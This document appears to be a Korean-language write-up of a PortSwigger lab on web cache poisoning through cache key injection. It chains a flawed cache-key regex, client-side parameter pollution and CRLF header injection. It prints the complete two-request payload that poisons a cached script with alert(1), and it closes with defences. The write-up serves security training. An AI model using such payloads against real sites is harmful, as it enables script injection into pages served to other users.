# Lab: Cache key injection

## 개요

- **난이도**: Expert
- **주제**: Web Cache Poisoning — Cache Key Injection / 클라이언트 측 파라미터 오염 / 응답 헤더 주입(CRLF) / HTTP/2
- **링크**: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection

## 목표

여러 독립 취약점(캐시 키 주입, 클라이언트 측 파라미터 오염, 응답 헤더 주입)을 결합해 캐시를 오염시키고 피해자 브라우저에서 `alert(1)` 을 실행시킨다.

## 결합되는 4가지 취약점

```
[1] /login 리다이렉트의 캐시 키 처리 결함
    잘못된 정규식으로 utm_content 파라미터를 캐시 키에서 제외
    → keyed 파라미터(lang) 뒤에 unkeyed 내용을 덧붙일 수 있음
       /login?lang=en?utm_content=anything

[2] /login/ 페이지의 클라이언트 측 파라미터 오염
    /js/localize.js 를 임포트하며 lang 값을 URL 인코딩하지 않음
    → lang 값에 추가 파라미터를 주입 가능 (client-side parameter pollution)

[3] /js/localize.js 의 응답 헤더 주입
    cors=1 파라미터가 설정되면 Origin 요청 헤더를 응답에 반영
    → Origin 에 CRLF(%0d%0a)을 넣어 헤더/본문 주입 (response header injection)

[4] 캐시 키 주입 (cache key injection)
    Pragma: x-get-cache-key 로 확인
    → 헤더 주입을 "URL 만으로" 트리거할 수 있음
```

## 핵심 개념

### 캐시 키 주입(Cache Key Injection)

```
[전제]
  캐시 키가 사용자 입력을 구분자와 함께 조합해 만들어질 때
  (예: query 파라미터 값이 그대로 키 문자열에 포함)

[문제]
  값에 구분자/제어문자를 주입하면
  - 키를 의도치 않게 조작(충돌/분리)하거나
  - 백엔드로 전달되는 값에 헤더/구문을 주입할 수 있음

[이 랩]
  origin 이라는 파라미터가 (1) 캐시 키에 포함되고
  (2) 백엔드에서 Origin 헤더로 사용됨
  → origin 값에 CRLF 를 주입하면 서브요청의 헤더를 조작
```

### 클라이언트 측 파라미터 오염(CSPP)

```
localize.js URL 을 만들 때 lang 값을 인코딩하지 않음
  /js/localize.js?lang=en            (정상)
  lang=en?utm_content=z&cors=1&x=1   (주입)
→ localize.js 요청에 임의 파라미터를 추가할 수 있음
   (여기서는 cors=1 을 켜서 [3]을 활성화)
```

### 진단 헤더

```
Pragma: x-get-cache-key
→ 응답에 캐시 키가 표시되어
   어떤 입력이 키에 포함되는지/주입 가능한지 확인
```

### HTTP/2 제약

```
주입하는 origin 헤더 이름은 반드시 소문자여야 함
  (HTTP/2 스펙: 헤더 이름 소문자)
  → Origin 이 아니라 origin 으로 주입
```

## 공격 단계

### 1단계 — /login 리다이렉트의 키 처리 확인

```
GET /login?lang=en?utm_content=anything
```

`utm_content` 가 캐시 키에서 제외되어, `lang` 뒤에 unkeyed 내용을 붙일 수 있음을 확인.

### 2단계 — localize.js 클라이언트 파라미터 오염

`/login/` 이 `/js/localize.js` 를 임포트하고 `lang` 미인코딩으로 CSPP 가 가능함을 확인.

### 3단계 — localize.js 응답 헤더 주입

```
GET /js/localize.js?lang=en&cors=1
Origin: <여기에 CRLF + 헤더/본문>
```

`cors=1` 일 때 Origin 이 반영되어 CRLF 주입이 가능.

### 4단계 — 캐시 키 주입 확인

```
Pragma: x-get-cache-key
```

`origin` 파라미터가 캐시 키에 포함되며, URL 로 헤더 주입을 트리거할 수 있음을 확인.

### 5단계 — 두 요청으로 캐시 오염 (공식 페이로드)

```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)

GET /login?lang=en?utm_content=x%26cors=1%26x=1$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$%23 HTTP/2
```

```
설명:
  - 첫 요청: /js/localize.js 응답에 CRLF 주입으로
    Content-Length: 8 + 본문 alert(1) 를 삽입 → JS 응답 본문이 alert(1) 이 됨
  - 둘째 요청: /login?lang=en 캐시를 오염시켜,
    리다이렉트된 로그인 페이지가 오염된 localize.js 를 임포트하도록 함
  - origin 값의 CRLF 는 이중 인코딩(%250d%250a)되어
    캐시 키/URL 을 거쳐 최종적으로 실제 CRLF 로 디코딩됨
  - origin 헤더 이름은 HTTP/2 규칙에 맞춰 소문자
```

### 6단계 — 결과

`/login?lang=en` 캐시가 오염되어, 로그인 페이지가 오염된 localization 임포트를 로드하며 `alert(1)` 실행 → 랩 해결.

## 정리: 왜 이 체인이 성립하는가

```
1) 캐시 키 결함 → unkeyed 내용을 keyed 입력에 덧붙임
2) CSPP        → localize.js 요청에 임의 파라미터(cors=1) 추가
3) 헤더 주입   → Origin CRLF 로 응답 분할(Content-Length + body)
4) 캐시 키 주입 → 위 헤더 주입을 URL 만으로 트리거/캐시
→ "URL 하나로 서브리소스 응답을 악성 JS 로 바꿔" 캐시 오염
```

## 방어

```
[근본 원인]
  1) 캐시 키를 값과 구분자를 문자열 결합으로 생성 (제어문자 미검증)
  2) 클라이언트가 넘긴 값을 URL 인코딩 없이 사용 (CSPP)
  3) Origin 등 요청 헤더를 응답에 반영 (CRLF 주입 가능)
  4) utm_content 등 파라미터를 잘못된 정규식으로 키에서 제외

[올바른 방어]
  1. 캐시 키 정규화/구조화
     - 값들을 표준 방식으로 파싱·정렬·정규화해 키 생성
     - 키에 포함되는 값의 제어문자(CR/LF/구분자) 제거·검증
  2. 출력/입력 인코딩
     - lang 등 값을 URL/HTML/JS 컨텍스트에 맞게 인코딩
  3. 헤더 주입 방지
     - 사용자 입력을 응답 헤더에 반영하지 않음
     - CRLF 등 제어문자 거부, 헤더 값 검증
  4. 파라미터 제외 규칙 정확화 (정규식 오류 제거)
  5. CORS(Origin) 반영 최소화, 신뢰 도메인만
  6. CSP 로 스크립트 실행 완화
  7. 캐시 가능 조건/키/정규화 주기 점검 (Pragma: x-get-cache-key)

[주의]
  각 취약점은 단독으로는 임팩트가 낮아도,
  캐시 키 주입 + CSPP + CRLF 주입이 결합되면
  단일 URL 로 저장형 XSS 급 오염이 가능하다.
```

## 핵심 정리

- 캐시 키에 사용자 입력이 구분자와 함께 포함되어, `origin` 값에 CRLF 를 주입해 서브요청 헤더를 조작할 수 있었다.
- `/login` 의 `utm_content` 키 제외 결함 + localize.js 의 CSPP(`cors=1`) + 응답 헤더 주입을 결합해, 단일 URL 로 localize.js 응답을 `alert(1)` 로 오염시켰다.
- `Pragma: x-get-cache-key` 로 캐시 키 주입 가능성을 진단했고, HTTP/2 규칙상 주입 헤더는 소문자(`origin`)여야 했다.
- 방어는 캐시 키 정규화(제어문자 제거), 값 인코딩, 헤더 반영 금지, 정확한 파라미터 제외 규칙이다.

## 배운 점

- Web Cache Poisoning 의 구현 결함 중 가장 복합적인 형태로, 캐시 키 자체를 공격 대상으로 삼는다.
- 캐시 키가 문자열 결합으로 만들어지면 값에 구분자/제어문자를 주입하는 것만으로 키 조작과 헤더 주입이 가능하다.
- 여러 독립 취약점(캐시 키 결함, CSPP, CRLF 주입, 파라미터 제외 오류)이 캐시를 매개로 연결된다.
- HTTP/2 헤더 이름 소문자 규칙 같은 프로토콜 세부사항도 익스플로잇 성립 여부를 좌우한다.
- 진단(`Pragma: x-get-cache-key`)과 단계별 검증이 복합 체인을 푸는 핵심이다.
